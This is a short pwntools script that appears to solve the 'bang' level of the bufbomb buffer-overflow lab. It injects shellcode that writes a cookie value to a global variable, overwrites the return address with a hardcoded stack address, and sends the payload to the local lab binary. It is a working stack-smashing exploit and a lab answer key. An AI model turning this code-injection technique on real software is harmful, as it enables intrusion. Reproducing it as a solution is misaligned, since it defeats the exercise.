from pwn import *

with open('./ID', 'r') as f:
    id = f.read().splitlines()[0]

sh = process(['./bufbomb', '-u', id])

length = 32
ebp = 0x556834a0
ret = 0x08048d05
cookie = 0x274adc8a
global_value_address = 0x0804c218

shellcode = asm('mov eax, {}; mov dword ptr[eax], {}; push {}; ret;'.format(global_value_address, cookie, ret))

exploit = flat([shellcode.ljust(length + 8, 'a'), 0xdeadbeef, ebp - length - 8])

with open('./bang_{}.txt'.format(id), 'w') as f:
    f.write(' '.join(char.encode('hex') for char in exploit))

sh.sendline(exploit)

sh.interactive()
